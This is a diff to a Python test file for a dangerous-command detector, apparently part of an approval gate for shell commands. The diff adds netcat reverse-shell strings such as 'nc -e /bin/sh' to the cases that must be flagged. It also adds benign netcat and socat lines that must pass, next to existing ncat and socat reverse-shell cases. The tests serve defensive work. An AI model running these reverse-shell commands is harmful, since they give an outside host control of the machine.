@@ -16,6 +16,8 @@ from tools.approval import detect_dangerous_command
     "ls; /usr/bin/ncat --exec /bin/sh host 4444",
     "socat tcp:host:4444 EXEC:/bin/bash",
     "socat TCP:host:4444 'SYSTEM:bash -li'",
+    "nc h 1 -e /bin/sh",
+    "cat x | nc -e /bin/sh host 1",
 ])
 def test_reverse_shell_requires_approval(command):
     assert detect_dangerous_command(command)[0] is True
@@ -26,6 +28,9 @@ def test_reverse_shell_requires_approval(command):
     'git commit -m "detect nc -e and socat exec: shells"',
     "grep /dev/tcp notes.txt",
     "nc -zv host 80",
+    "nc -z db 5432 && psql -c 'select 1'",
+    "nc -zv h 80 || echo -e down",
+    "socat TCP-LISTEN:80 TCP:h:80 & echo exec:started",
     "socat - tcp:host:80",
 ])
 def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
